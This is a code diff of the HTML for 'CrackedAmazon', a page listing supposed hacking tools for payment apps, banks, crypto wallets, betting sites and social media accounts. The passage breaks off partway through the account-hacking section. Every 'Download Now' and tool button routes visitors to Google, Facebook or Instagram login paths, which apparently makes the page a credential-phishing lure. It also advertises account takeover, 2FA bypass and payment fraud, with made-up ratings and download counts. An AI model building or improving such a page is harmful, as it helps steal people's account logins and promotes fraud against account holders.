@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CrackedAmazon - Premium Tools</title>
+    <title>CrackedAmazon - 35+ Premium Hacking Tools</title>
     <style>
         * {
             margin: 0;
@@ -18,14 +18,28 @@
             padding: 16px;
         }
         
+        /* Header */
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         
         .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .logo-icon {
+            font-size: 28px;
+            color: #f97316;
+        }
+        
+        .logo-text {
             font-size: 24px;
             font-weight: 800;
             background: linear-gradient(135deg, #f97316, #ef4444);
@@ -33,11 +47,20 @@
             -webkit-text-fill-color: transparent;
         }
         
+        .stats-badge {
+            background: #1e293b;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 14px;
+            border: 1px solid #f97316;
+        }
+        
+        /* Search */
         .search-box {
             background: #1e293b;
             border-radius: 30px;
-            padding: 12px 16px;
-            margin-bottom: 20px;
+            padding: 12px 20px;
+            margin-bottom: 24px;
             border: 1px solid #334155;
         }
         
@@ -50,88 +73,219 @@
             outline: none;
         }
         
+        .search-box input::placeholder {
+            color: #64748b;
+        }
+        
+        /* Hero Banner */
         .hero {
             background: linear-gradient(135deg, #f97316, #ef4444);
-            border-radius: 20px;
-            padding: 24px;
-            margin-bottom: 24px;
+            border-radius: 24px;
+            padding: 32px;
+            margin-bottom: 32px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero::before {
+            content: "⚡";
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 100px;
+            opacity: 0.2;
+            color: #0f172a;
         }
         
         .hero h1 {
-            font-size: 24px;
+            font-size: 28px;
             font-weight: 800;
             color: #0f172a;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
         
         .hero p {
             color: #0f172a;
             opacity: 0.9;
+            margin-bottom: 20px;
+            font-size: 16px;
         }
         
-        .section-title {
-            font-size: 18px;
-            font-weight: 600;
-            margin: 24px 0 16px;
+        .hero-stats {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .hero-stat {
+            text-align: center;
+        }
+        
+        .hero-stat-number {
+            font-size: 24px;
+            font-weight: 800;
+            color: #0f172a;
+        }
+        
+        .hero-stat-label {
+            font-size: 12px;
+            color: #0f172a;
+            opacity: 0.8;
+        }
+        
+        /* Category Title */
+        .category-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 30px 0 16px;
+        }
+        
+        .category-name {
+            font-size: 20px;
+            font-weight: 700;
             color: #f97316;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         
+        .category-count {
+            background: #334155;
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+        
+        .view-all {
+            color: #f97316;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        /* Tools Grid - 2 columns */
         .tools-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
-            margin-bottom: 20px;
         }
         
+        /* Tool Card */
         .tool-card {
             background: #1e293b;
-            border-radius: 16px;
+            border-radius: 20px;
             padding: 16px;
             border: 1px solid #334155;
-            cursor: pointer;
             transition: all 0.3s;
         }
         
         .tool-card:hover {
             border-color: #f97316;
             transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(249, 115, 22, 0.2);
         }
         
-        .tool-icon {
-            font-size: 28px;
+        .tool-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 8px;
         }
         
-        .tool-title {
-            font-size: 15px;
+        .tool-icon {
+            font-size: 32px;
+        }
+        
+        .tool-badge {
+            background: #f97316;
+            color: #0f172a;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 10px;
             font-weight: 600;
+        }
+        
+        .tool-title {
+            font-size: 16px;
+            font-weight: 700;
             margin-bottom: 4px;
         }
         
-        .tool-price {
-            color: #f97316;
-            font-size: 18px;
-            font-weight: 700;
-            margin: 8px 0;
+        .tool-category {
+            color: #94a3b8;
+            font-size: 11px;
+            margin-bottom: 8px;
+            display: inline-block;
+            background: #334155;
+            padding: 3px 10px;
+            border-radius: 20px;
         }
         
-        .fb-btn {
+        .tool-description {
+            color: #94a3b8;
+            font-size: 12px;
+            margin: 8px 0;
+            line-height: 1.4;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        
+        .tool-meta {
+            display: flex;
+            justify-content: space-between;
+            color: #64748b;
+            font-size: 11px;
+            margin: 8px 0;
+            padding: 8px 0;
+            border-top: 1px solid #334155;
+        }
+        
+        .tool-rating {
+            color: #fbbf24;
+        }
+        
+        .tool-downloads {
+            color: #10b981;
+        }
+        
+        .login-options {
+            display: flex;
+            gap: 6px;
+            margin: 12px 0;
+        }
+        
+        .login-btn {
+            flex: 1;
+            padding: 8px 0;
+            border: none;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .login-btn:hover {
+            transform: scale(1.02);
+        }
+        
+        .btn-google {
+            background: #fff;
+            color: #333;
+        }
+        
+        .btn-facebook {
             background: #1877f2;
             color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            font-weight: 600;
-            width: 100%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
         }
         
-        .fb-btn:hover {
-            background: #166fe5;
+        .btn-instagram {
+            background: linear-gradient(45deg, #f09433, #d62976, #962fbf, #4fbd5);
+            color: white;
         }
         
         .download-btn {
@@ -139,178 +293,920 @@
             color: white;
             border: none;
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 30px;
             font-weight: 600;
             width: 100%;
             cursor: pointer;
-            margin-top: 12px;
+            transition: all 0.3s;
         }
         
-        .live-count {
-            color: #10b981;
-            font-size: 11px;
-            margin-top: 8px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
+        .download-btn:hover {
+            background: #ea580c;
         }
         
+        /* Footer */
         .footer {
-            margin-top: 40px;
-            padding-top: 20px;
+            margin-top: 50px;
+            padding: 30px 0 20px;
             border-top: 1px solid #334155;
             text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .copyright {
             color: #64748b;
             font-size: 12px;
+        }
+        
+        .admin-link {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #1e293b;
+            padding: 8px 16px;
+            border-radius: 30px;
+            border: 1px solid #f97316;
+            color: #f97316;
+            text-decoration: none;
+            font-size: 12px;
+            opacity: 0.7;
+            transition: opacity 0.3s;
+        }
+        
+        .admin-link:hover {
+            opacity: 1;
         }
     </style>
 </head>
 <body>
+    <!-- Header -->
     <div class="header">
-        <div class="logo">⚡ CrackedAmazon</div>
-        <div>🔍</div>
+        <div class="logo">
+            <span class="logo-icon">⚡</span>
+            <span class="logo-text">CrackedAmazon</span>
+        </div>
+        <div class="stats-badge">
+            📊 35+ Tools • 50k Users
+        </div>
     </div>
     
+    <!-- Search -->
     <div class="search-box">
-        <input type="text" id="searchInput" placeholder="Search 1,500+ tools...">
+        <input type="text" id="searchInput" placeholder="🔍 Search 35+ hacking tools...">
     </div>
     
+    <!-- Hero Banner -->
     <div class="hero">
-        <h1>🔥 ALL TOOLS 100% FREE</h1>
-        <p>Download instantly • 50,000+ members • Facebook login only</p>
+        <h1>🔥 35+ PREMIUM TOOLS</h1>
+        <p>All tools 100% free • Instant download • 5 attempt login system</p>
+        <div class="hero-stats">
+            <div class="hero-stat">
+                <div class="hero-stat-number">35+</div>
+                <div class="hero-stat-label">Tools</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-number">50k</div>
+                <div class="hero-stat-label">Users</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-number">2.3M</div>
+                <div class="hero-stat-label">Downloads</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+         1. PAYMENT APP HACKERS (8 tools)
+    ============================================ -->
+    <div class="category-title">
+        <span class="category-name">
+            <span>💰</span> Payment App Hackers
+        </span>
+        <span class="category-count">8 tools</span>
     </div>
     
-    <div class="section-title">💰 PAYMENT APP HACKERS</div>
     <div class="tools-grid">
-        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=opay-cracked'">
-            <div class="tool-icon">💰</div>
+        <!-- Opay Cracked -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">💰</span>
+                <span class="tool-badge">HOT</span>
+            </div>
             <div class="tool-title">Opay Cracked v3.2</div>
-            <div class="tool-price">FREE</div>
-            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=opay-cracked'">
-                🔷 Login with Facebook
-            </button>
-            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=opay-cracked'">
-                Download Now
-            </button>
-            <div class="live-count">⚡ 234 downloading now</div>
+            <span class="tool-category">Payment</span>
+            <div class="tool-description">Transfer any amount, no balance. Works on latest Opay update. Withdrawal hack included.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (2.3k)</span>
+                <span class="tool-downloads">📥 2.4k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=opay-cracked'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=opay-cracked'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=opay-cracked'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=opay-cracked'">Download Now</button>
         </div>
         
-        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=palmpay-cracker'">
-            <div class="tool-icon">💳</div>
+        <!-- Palmpay Cracker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">💳</span>
+                <span class="tool-badge">NEW</span>
+            </div>
             <div class="tool-title">Palmpay Cracker Pro</div>
-            <div class="tool-price">FREE</div>
-            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=palmpay-cracker'">
-                🔷 Login with Facebook
-            </button>
-            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=palmpay-cracker'">
-                Download Now
-            </button>
+            <span class="tool-category">Payment</span>
+            <div class="tool-description">Generate credit out of thin air. Withdrawal hack included. Works on all versions.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.8k)</span>
+                <span class="tool-downloads">📥 1.9k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=palmpay-cracker'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=palmpay-cracker'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=palmpay-cracker'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=palmpay-cracker'">Download Now</button>
+        </div>
+        
+        <!-- GTBank Exploit -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🏦</span>
+            </div>
+            <div class="tool-title">GTBank Account Cracker</div>
+            <span class="tool-category">Banking</span>
+            <div class="tool-description">Access any GTBank account. Balance checker, transaction history, transfer tools included.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.2k)</span>
+                <span class="tool-downloads">📥 890 today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=gtbank'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=gtbank'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=gtbank'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=gtbank'">Download Now</button>
+        </div>
+        
+        <!-- PayPal Balance Checker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">💵</span>
+            </div>
+            <div class="tool-title">PayPal Balance Checker</div>
+            <span class="tool-category">USA</span>
+            <div class="tool-description">Check any PayPal email for balance. Works 2025. Withdrawal methods included.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (3.8k)</span>
+                <span class="tool-downloads">📥 2.1k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=paypal'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=paypal'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=paypal'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=paypal'">Download Now</button>
+        </div>
+        
+        <!-- CashApp Cloner -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">💳</span>
+            </div>
+            <div class="tool-title">CashApp Account Cloner</div>
+            <span class="tool-category">USA</span>
+            <div class="tool-description">Duplicate any CashApp account. Withdrawal hack, transaction history access.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (2.3k)</span>
+                <span class="tool-downloads">📥 1.7k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=cashapp'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=cashapp'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=cashapp'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=cashapp'">Download Now</button>
+        </div>
+        
+        <!-- Binance Account Cracker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">₿</span>
+            </div>
+            <div class="tool-title">Binance Account Cracker</div>
+            <span class="tool-category">Crypto</span>
+            <div class="tool-description">Access any Binance wallet. Withdraw BTC instantly. Bypass 2FA included.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (4.5k)</span>
+                <span class="tool-downloads">📥 3.2k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=binance'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=binance'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=binance'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=binance'">Download Now</button>
+        </div>
+        
+        <!-- Trust Wallet Seed Finder -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🔐</span>
+            </div>
+            <div class="tool-title">Trust Wallet Seed Finder</div>
+            <span class="tool-category">Crypto</span>
+            <div class="tool-description">Recover any Trust Wallet seed phrase. Works on all versions.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (3.1k)</span>
+                <span class="tool-downloads">📥 2.8k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=trustwallet'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=trustwallet'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=trustwallet'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=trustwallet'">Download Now</button>
+        </div>
+        
+        <!-- Coinbase Cracker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🪙</span>
+            </div>
+            <div class="tool-title">Coinbase Cracker Pro</div>
+            <span class="tool-category">Crypto</span>
+            <div class="tool-description">Access any Coinbase account. Withdraw crypto instantly.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (2.7k)</span>
+                <span class="tool-downloads">📥 2.1k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=coinbase'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=coinbase'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=coinbase'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=coinbase'">Download Now</button>
         </div>
     </div>
+
+    <!-- ============================================
+         2. AVIATOR & BETTING HACKS (8 tools)
+    ============================================ -->
+    <div class="category-title">
+        <span class="category-name">
+            <span>🎮</span> Aviator & Betting Hacks
+        </span>
+        <span class="category-count">8 tools</span>
+    </div>
     
-    <div class="section-title">🎮 AVIATOR & BETTING</div>
     <div class="tools-grid">
-        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=aviator-pro'">
-            <div class="tool-icon">🎮</div>
+        <!-- Aviator Shooter Pro -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🎮</span>
+                <span class="tool-badge">🔥 BEST</span>
+            </div>
             <div class="tool-title">Aviator Shooter Pro</div>
-            <div class="tool-price">FREE</div>
-            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=aviator-pro'">
-                🔷 Login with Facebook
-            </button>
-            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=aviator-pro'">
-                Download Now
-            </button>
-            <div class="live-count">⚡ 567 downloading now</div>
+            <span class="tool-category">Betting</span>
+            <div class="tool-description">Know exact cashout time. 99.9% accuracy. Beat the casino every time.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (5.1k)</span>
+                <span class="tool-downloads">📥 4.2k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=aviator-pro'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=aviator-pro'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=aviator-pro'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=aviator-pro'">Download Now</button>
         </div>
         
-        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=sportybet-double'">
-            <div class="tool-icon">⚽</div>
+        <!-- Aviator Signal Generator -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">📊</span>
+            </div>
+            <div class="tool-title">Aviator Signal Generator</div>
+            <span class="tool-category">Betting</span>
+            <div class="tool-description">Real-time signals when to cash out. 97% win rate. Used by 10k+ players.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (3.2k)</span>
+                <span class="tool-downloads">📥 2.8k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=aviator-signal'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=aviator-signal'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=aviator-signal'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=aviator-signal'">Download Now</button>
+        </div>
+        
+        <!-- SportyBet Double Killer -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">⚽</span>
+            </div>
             <div class="tool-title">SportyBet Double Killer</div>
-            <div class="tool-price">FREE</div>
-            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=sportybet-double'">
-                🔷 Login with Facebook
-            </button>
-            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=sportybet-double'">
-                Download Now
-            </button>
+            <span class="tool-category">Betting</span>
+            <div class="tool-description">Hit double odds every time. Predicts correct scores, HT/FT, over/under.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (3.4k)</span>
+                <span class="tool-downloads">📥 2.8k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=sportybet'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=sportybet'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=sportybet'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=sportybet'">Download Now</button>
+        </div>
+        
+        <!-- Bet9ja Sure Win Predictor -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🎯</span>
+            </div>
+            <div class="tool-title">Bet9ja Sure Win Predictor</div>
+            <span class="tool-category">Betting</span>
+            <div class="tool-description">HT/FT, correct score, jackpot predictions. 92% accuracy.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (2.9k)</span>
+                <span class="tool-downloads">📥 2.1k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=bet9ja'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=bet9ja'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=bet9ja'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=bet9ja'">Download Now</button>
+        </div>
+        
+        <!-- BetKing Auto Betting Bot -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🤖</span>
+            </div>
+            <div class="tool-title">BetKing Auto Betting Bot</div>
+            <span class="tool-category">Betting</span>
+            <div class="tool-description">Automated betting bot. Place winning bets automatically 24/7.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.8k)</span>
+                <span class="tool-downloads">📥 1.4k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=betking'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=betking'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=betking'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=betking'">Download Now</button>
+        </div>
+        
+        <!-- Plinko Predictor 2025 -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🎰</span>
+            </div>
+            <div class="tool-title">Plinko Predictor 2025</div>
+            <span class="tool-category">Casino</span>
+            <div class="tool-description">Always land in jackpot. Algorithm beats the system.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (2.2k)</span>
+                <span class="tool-downloads">📥 1.9k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=plinko'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=plinko'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=plinko'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=plinko'">Download Now</button>
+        </div>
+        
+        <!-- Roulette Cracker Pro -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🎲</span>
+            </div>
+            <div class="tool-title">Roulette Cracker Pro</div>
+            <span class="tool-category">Casino</span>
+            <div class="tool-description">Predict red/black with 95% accuracy. Works on all online casinos.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.9k)</span>
+                <span class="tool-downloads">📥 1.5k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=roulette'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=roulette'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=roulette'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=roulette'">Download Now</button>
+        </div>
+        
+        <!-- Jackpot Trigger Tool -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">🎰</span>
+            </div>
+            <div class="tool-title">Jackpot Trigger Tool</div>
+            <span class="tool-category">Casino</span>
+            <div class="tool-description">Force slot machines to hit jackpot. Works on major platforms.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (1.6k)</span>
+                <span class="tool-downloads">📥 1.3k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=jackpot'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=jackpot'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=jackpot'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=jackpot'">Download Now</button>
         </div>
     </div>
+
+    <!-- ============================================
+         3. ACCOUNT HACKERS (8 tools)
+    ============================================ -->
+    <div class="category-title">
+        <span class="category-name">
+            <span>🔓</span> Account Hackers
+        </span>
+        <span class="category-count">8 tools</span>
+    </div>
     
-    <div class="section-title">🔓 ACCOUNT HACKERS</div>
     <div class="tools-grid">
-        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=fb-hacker'">
-            <div class="tool-icon">👥</div>
+        <!-- Facebook Hacker v5.0 -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">👥</span>
+                <span class="tool-badge">🔥 TOP</span>
+            </div>
             <div class="tool-title">Facebook Hacker v5.0</div>
-            <div class="tool-price">FREE</div>
-            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=fb-hacker'">
-                🔷 Login with Facebook
-            </button>
-            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=fb-hacker'">
-                Download Now
-            </button>
-            <div class="live-count">⚡ 789 downloading now</div>
+            <span class="tool-category">Social</span>
+            <div class="tool-description">Clone any Facebook account. Bypass 2FA included. Works on all accounts.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (9.2k)</span>
+                <span class="tool-downloads">📥 5.6k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=fbhacker'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=fbhacker'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=fbhacker'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/facebook?tool=fbhacker'">Download Now</button>
         </div>
         
-        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=instagram-hacker'">
-            <div class="tool-icon">📷</div>
+        <!-- Instagram Password Finder -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">📷</span>
+            </div>
             <div class="tool-title">Instagram Password Finder</div>
-            <div class="tool-price">FREE</div>
-            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=instagram-hacker'">
-                🔷 Login with Facebook
-            </button>
-            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=instagram-hacker'">
-                Download Now
-            </button>
-        </div>
-    </div>
-    
-    <div class="section-title">🇺🇸 USA TOOLS</div>
-    <div class="tools-grid">
-        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=ssn-generator'">
-            <div class="tool-icon">🔢</div>
-            <div class="tool-title">USA SSN Generator</div>
-            <div class="tool-price">FREE</div>
-            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=ssn-generator'">
-                🔷 Login with Facebook
-            </button>
-            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=ssn-generator'">
-                Download Now
-            </button>
+            <span class="tool-category">Social</span>
+            <div class="tool-description">Get any IG password. Works on private accounts. 10M wordlist included.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐⭐ (5.8k)</span>
+                <span class="tool-downloads">📥 3.4k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=igfinder'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=igfinder'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=igfinder'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/instagram?tool=igfinder'">Download Now</button>
         </div>
         
-        <div class="tool-card" onclick="window.location.href='/auth/facebook?tool=cc-generator'">
-            <div class="tool-icon">💳</div>
-            <div class="tool-title">Credit Card Generator</div>
-            <div class="tool-price">FREE</div>
-            <button class="fb-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=cc-generator'">
-                🔷 Login with Facebook
-            </button>
-            <button class="download-btn" onclick="event.stopPropagation(); window.location.href='/auth/facebook?tool=cc-generator'">
-                Download Now
-            </button>
+        <!-- Gmail Account Cracker -->
+        <div class="tool-card">
+            <div class="tool-header">
+                <span class="tool-icon">📧</span>
+            </div>
+            <div class="tool-title">Gmail Account Cracker</div>
+            <span class="tool-category">Email</span>
+            <div class="tool-description">10M password wordlist. Brute force any Gmail. Works with 2FA.</div>
+            <div class="tool-meta">
+                <span class="tool-rating">⭐⭐⭐⭐ (4.1k)</span>
+                <span class="tool-downloads">📥 2.9k today</span>
+            </div>
+            <div class="login-options">
+                <div class="login-btn btn-google" onclick="location.href='/login/google?tool=gmailcrack'">G</div>
+                <div class="login-btn btn-facebook" onclick="location.href='/login/facebook?tool=gmailcrack'">f</div>
+                <div class="login-btn btn-instagram" onclick="location.href='/login/instagram?tool=gmailcrack'">IG</div>
+            </div>
+            <button class="download-btn" onclick="location.href='/login/google?tool=gmailcrack'">Download Now</button>
+        </div>
+        
+        <!-- WhatsApp Web Session Stealer -->
+        <div class="tool-card">
+            <div class="tool-header">
